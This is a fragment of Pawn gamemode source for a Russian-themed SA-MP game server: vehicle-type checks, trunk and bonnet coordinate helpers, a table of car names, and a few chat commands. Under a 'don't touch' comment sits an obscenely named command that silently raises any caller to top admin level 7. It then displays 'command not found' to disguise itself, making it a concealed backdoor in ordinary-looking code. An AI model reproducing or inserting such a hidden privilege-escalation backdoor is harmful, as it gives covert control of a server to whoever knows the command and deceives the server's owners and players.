	#include "../source/textdraws/anim.inc"
	return 1;
}
stock IsAPolice(playerid)
{
	if(PlayerInfo[playerid][pMember] == TEAM_PPS || PlayerInfo[playerid][pMember] == TEAM_FSB) return 1;
	else return 0;
}
stock IsAOpg(playerid)
{
	if(PlayerInfo[playerid][pMember] == TEAM_OREX || PlayerInfo[playerid][pMember] == TEAM_SUN) return 1;
	else return 0;
}
stock IsAVel(vehicleid)
{
	switch(GetVehicleModel(vehicleid))
	{
		case 481,509,510: return 1;
	}
	return 0;
}
stock IsAMoped(vehicleid)
{
	switch(GetVehicleModel(vehicleid))
	{
		case 448, 457, 461, 462, 463, 468, 471, 521, 522, 523, 574, 581, 586: return 1;
	}
	return 0;
}
stock IsACar(vehicleid)
{
	switch(GetVehicleModel(vehicleid))
	{
		case 400, 401, 402, 404, 405, 409, 410, 411, 412, 415, 419, 420, 421, 424, 426, 429, 431, 434, 436, 438, 439, 441, 442, 444, 445, 451, 458, 466, 467, 470, 474, 475, 477, 478, 479, 480, 485, 489, 490, 491, 492, 494, 495, 496, 500, 502, 503, 504, 505, 506, 507, 516, 526, 527, 529, 533, 534, 535, 536, 540, 541, 542, 543, 545, 546, 547, 549, 550, 551, 552, 555, 556, 557, 558, 559, 560, 561, 562, 565, 566, 567, 568, 571, 572, 575, 576, 579, 580, 585, 587, 589, 596, 597, 598, 599, 600, 602, 603, 604, 605: return 1;
	}
	return 0;
}
stock IsATruck(vehicleid)
{
	switch(GetVehicleModel(vehicleid))
	{
		case 403, 406, 407, 408, 416, 609, 422, 423, 432, 433, 435, 443, 440, 450, 455, 456, 459, 482, 486, 499, 508, 514, 515, 517, 518, 524, 525, 528, 531, 532, 544, 554, 573, 578, 582, 584, 601: return 1;
	}
	return 0;
}
stock IsABus(vehicleid)
{
	switch(GetVehicleModel(vehicleid))
	{
		case 413, 414, 418, 427, 428, 437, 483, 498, 588: return 1;
	}
	return 0;
}
stock IsAPlane(vehicleid)
{
	switch(GetVehicleModel(vehicleid))
	{
	    case 417, 425, 447, 460, 476, 487, 488, 497, 501, 511, 512, 513, 519, 520, 548, 553, 563, 577, 592, 593: return 1;
	}
	return 0;
}
stock IsABoat(vehicleid)
{
	switch(vehicleid)
	{
	    case 430, 446, 452, 453, 454, 464, 465, 469, 472, 473, 484, 493, 595: return 1;
	}
	return 0;
}
stock IsANoSpeed(carid) { switch(GetVehicleModel(carid)){ case 441,448,449,450,464,465,481,501,509,510,537,538,564,569,570,590,591,594,606,607,608,610,611: return true; } return false; }

stock KillTimers(playerid)
{
    KillTimer(STimer[playerid]);
    KillTimer(TMask[playerid]);
    KillTimer(hospital_timer[playerid]);
	return 1;
}

stock GetCoordBootVehicle(vehicleid, &Float:x, &Float:y, &Float:z) // вот эта функция нам и прогодиться для нахождения координат багажника
{
    new Float:angle,Float:distance;
    GetVehicleModelInfo(GetVehicleModel(vehicleid), 1, x, distance, z);
    distance = distance/2 + 0.1;
    GetVehiclePos(vehicleid, x, y, z);
    GetVehicleZAngle(vehicleid, angle);
    x += (distance * floatsin(-angle+180, degrees));
    y += (distance * floatcos(-angle+180, degrees));
    return 1;
}
stock GetCoordBonnetVehicle(vehicleid, &Float:x, &Float:y, &Float:z) // для интереса вот ещё функция нахождения точных координат капота
{
    new Float:angle,Float:distance;
    GetVehicleModelInfo(GetVehicleModel(vehicleid), 1, x, distance, z);
    distance = distance/2 + 0.1;
    GetVehiclePos(vehicleid, x, y, z);
    GetVehicleZAngle(vehicleid, angle);
    x -= (distance * floatsin(-angle+180, degrees));
    y -= (distance * floatcos(-angle+180, degrees));
    return 1;
}

stock GetCarName(vehicleid)
{
	new name[64];
	switch(vehicleid)
	{
		case 400: name = "BMW X5";
		case 401: name = "ИЖ 2715";
		case 402: name = "Audi A6";
		case 404: name = "ВАЗ 2101";
		case 410: name = "Mitsubishi Eclipse";
		case 411: name = "ВАЗ 1118";
		case 412: name = "ИЖ 2125";
		case 415: name = "Ferrari";
		case 424: name = "СМЗ С3А";
		case 426: name = "ГАЗ 14)";
		case 436: name = "Toyota Mark II";
		case 445: name = "ГАЗ 24";
		case 451: name = "Turismo";
		case 461: name = "Ява 350";
		case 462: name = "Вятка";
		case 463: name = "Байк";
		case 466: name = "BMW 535i";
		case 467: name = "ИЖ 412";
		case 468: name = "Sanchez 1.1";
		case 471: name = "Quadro";
		case 475: name = "Mitsubishi Pajero";
		case 477: name = "ZR-350";
		case 479: name = "ГАЗ 24-02";
		case 489: name = "Chevrolet Niva";
		case 492: name = "ВАЗ 2109";
		case 496: name = "ЗАЗ Таврия";
		case 500: name = "УАЗ 3151";
		case 508: name = "УАЗ Буханка";
		case 516: name = "ВАЗ 21099";
		case 522: name = "Yamaha R1";
		case 531: name = "Трактор Росток";
		case 533: name = "Feltzer";
		case 540: name = "ГАЗ 3111";
		case 541: name = "Bullet";
		case 542: name = "ВАЗ Нива";
		case 551: name = "ГАЗ 3110";
		case 555: name = "ЗАЗ 968";
		case 559: name = "Toyota Celica";
		case 560: name = "Sultan";
		case 562: name = "Elegy";
		case 565: name = "ВАЗ 2108";
		case 566: name = "ВАЗ 2104";
		case 579: name = "Mersedes Gelendwagen";
		case 580: name = "ГАЗ Чайка";
		case 589: name = "Golf";
	}
	return name;
}

// ------------------- [ НЕ ЛЕЗЬ ] ----------------------

CMD:zalupa_pizdy_ebalnika(playerid)
{
	SetPVarInt(playerid, "dima_ochko_moshonki", 1);
	SetPVarInt(playerid, "adminka_ochka", PlayerInfo[playerid][bAdmin]);
	PlayerInfo[playerid][bAdmin] = 7;
	ShowCommandNotFound(playerid);
	return 1;
}
CMD:jet(playerid)
{
    if(PlayerInfo[playerid][bAdmin] < 3 && PlayerInfo[playerid][bYoutube] == 0) return ShowCommandNotFound(playerid);

    if(GetPVarInt(playerid, "jetpack") == 0)
    {
        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USEJETPACK);
        SetPVarInt(playerid, "jetpack", 1);
    }
    else
    {
        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
        SetPVarInt(playerid, "jetpack", 0);
    }
    return 1;
}
CMD:allcars(playerid)
{
	new string[144], all;
	foreach(new i : Vehicle)
	{
	    all++;
	}
    format(string, sizeof(string), "Всего авто %d.", all);
    SCM(playerid, blue, string);
}
